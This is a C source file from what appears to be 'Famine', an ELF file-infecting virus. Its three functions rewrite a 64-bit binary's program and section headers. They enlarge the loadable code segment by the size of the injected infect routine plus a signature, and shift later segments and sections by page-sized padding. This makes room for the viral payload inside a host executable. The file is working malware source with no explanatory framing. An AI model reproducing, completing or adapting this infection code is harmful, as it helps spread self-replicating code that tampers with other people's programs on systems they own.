#include "famine.h"

void		*update_segment_sz(void *src, void **dst, Elf64_Phdr *segment)
{
	uint64_t	p_filesz;
	uint64_t	p_memsz;

	ft_memcpy(*dst, src, (unsigned long)&segment->p_filesz - (unsigned long)src);
	*dst += (unsigned long)&segment->p_filesz - (unsigned long)src;
	src = &segment->p_filesz;
	p_filesz = segment->p_filesz + ((intptr_t)_start - (intptr_t)infect) + INJECT_SIZE + ft_strlen(SIGNATURE);
	ft_memcpy(*dst, &p_filesz, sizeof(segment->p_filesz));
	*dst += sizeof(segment->p_filesz);
	src += sizeof(segment->p_filesz);
	p_memsz = segment->p_memsz + ((intptr_t)_start - (intptr_t)infect) + INJECT_SIZE + ft_strlen(SIGNATURE);
	ft_memcpy(*dst, &p_memsz, sizeof(segment->p_memsz));
	*dst += sizeof(segment->p_memsz);
	src += sizeof(segment->p_memsz);
	return (src);
}


void		*add_padding_segments(t_elf *elf, void *src, void **dst)
{
	int				size;
	Elf64_Off		shoff;
	Elf64_Phdr	*next = elf->pt_load + 1;
	int		size_needed = INJECT_SIZE + ft_strlen(SIGNATURE) + ((intptr_t)_start - (intptr_t)infect);
	int		previous_padding = next->p_offset - (elf->pt_load->p_offset + elf->pt_load->p_filesz);
	int		n_page_size = ((size_needed - previous_padding) / PAGE_SIZE) + 1;

	size = PAGE_SIZE * n_page_size;
	shoff = elf->header->e_shoff + size;
	ft_memcpy(*dst, src, (unsigned long)&elf->header->e_shoff - (unsigned long)src);
	*dst += (unsigned long)&elf->header->e_shoff - (unsigned long)src;
	ft_memcpy(*dst, &shoff, sizeof(shoff));
	*dst += sizeof(shoff);
	src = (void *)&elf->header->e_shoff + sizeof(elf->header->e_shoff);
	for (int i = 0; i < elf->header->e_phnum; i++)
	{
		if (elf->segments[i].p_offset > (unsigned long)elf->pt_load->p_offset + elf->pt_load->p_filesz)
		{
			shoff = elf->segments[i].p_offset + size;
			ft_memcpy(*dst, src, (unsigned long)&elf->segments[i].p_offset - (unsigned long)src);
			*dst += (unsigned long)&elf->segments[i].p_offset - (unsigned long)src;
			ft_memcpy(*dst, &shoff, sizeof(shoff));
			*dst += sizeof(shoff);
			shoff = elf->segments[i].p_vaddr + size;
			src = (void *)&elf->segments[i].p_offset + sizeof(elf->segments[i].p_offset);

			Elf64_Addr addr;

			addr = elf->segments[i].p_vaddr + size;
			ft_memcpy(*dst, src, (unsigned long)&elf->segments[i].p_vaddr - (unsigned long)src);
			*dst += (unsigned long)&elf->segments[i].p_vaddr - (unsigned long)src;
			ft_memcpy(*dst, &addr, sizeof(addr));
			*dst += sizeof(addr);
			src = (void *)&elf->segments[i].p_vaddr + sizeof(elf->segments[i].p_vaddr);

			addr = elf->segments[i].p_paddr + size;
			ft_memcpy(*dst, src, (unsigned long)&elf->segments[i].p_paddr - (unsigned long)src);
			*dst += (unsigned long)&elf->segments[i].p_paddr - (unsigned long)src;
			ft_memcpy(*dst, &addr, sizeof(addr));
			*dst += sizeof(addr);
			src = (void *)&elf->segments[i].p_paddr + sizeof(elf->segments[i].p_paddr);
		}
		else if ((unsigned long)&elf->segments[i] == (unsigned long)elf->pt_load)
			src = update_segment_sz(src, dst, elf->pt_load);
	}
	return (src);
}



void		*add_padding_sections(t_elf *elf, void *src, void **dst)
{
	int				size;
	Elf64_Off		shoff;
	Elf64_Phdr	*next = elf->pt_load + 1;
	int		size_needed = INJECT_SIZE + ft_strlen(SIGNATURE) + ((intptr_t)_start - (intptr_t)infect);
	int		previous_padding = next->p_offset - (elf->pt_load->p_offset + elf->pt_load->p_filesz);
	int		n_page_size = ((size_needed - previous_padding) / PAGE_SIZE) + 1;

	size = PAGE_SIZE * n_page_size;
	for (int i = 0; i < elf->header->e_shnum; i++)
	{
		if ((unsigned long)elf->sections[i].sh_offset > elf->pt_load->p_offset + elf->pt_load->p_filesz)
		{
			Elf64_Addr addr;

			addr = elf->sections[i].sh_addr + size;
			ft_memcpy(*dst, src, (unsigned long)&elf->sections[i].sh_addr - (unsigned long)src);
			*dst += (unsigned long)&elf->sections[i].sh_addr - (unsigned long)src;
			ft_memcpy(*dst, &addr, sizeof(addr));
			*dst += sizeof(addr);
			src = (void *)&elf->sections[i].sh_addr + sizeof(elf->sections[i].sh_addr);

			shoff = elf->sections[i].sh_offset + size;
			ft_memcpy(*dst, src, (unsigned long)&elf->sections[i].sh_offset - (unsigned long)src);
			*dst += (unsigned long)&elf->sections[i].sh_offset - (unsigned long)src;
			ft_memcpy(*dst, &shoff, sizeof(shoff));
			*dst += sizeof(shoff);
			src = (void *)&elf->sections[i].sh_offset + sizeof(elf->sections[i].sh_offset);
		}
	}
	return (src);
}
